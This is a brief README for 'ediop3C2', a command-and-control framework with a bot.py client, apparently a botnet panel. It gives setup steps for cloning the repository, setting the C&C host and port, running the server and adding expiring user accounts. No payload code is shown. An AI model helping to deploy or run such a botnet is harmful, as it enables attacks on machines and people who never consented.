# ediop3C2
A c2 framework. Made it as .zip so every folder can be stored


• Install Git and Python 3 on your server.

• Clone the ediop3C2 Github repository to your server via Git: $

• • git clone https://github.com/ediop3SquadALT/ediop3C2

• • Change the host address and C&C port in the configuration section in bot.py to your server address and C&C port.

• • Install the requirements.txt

• • Start the C2 server by executing the command:  • python main.py

• • Add accounts in logins.txt

•  using the format:

username:password:yyyy-mm-dd

• Configure the port • on the config.json

•  { "cnc_host": "0.0.0.0", "reg_host": "0.0.0.0", "cnc_port": 5511, "reg_port": 5512 }
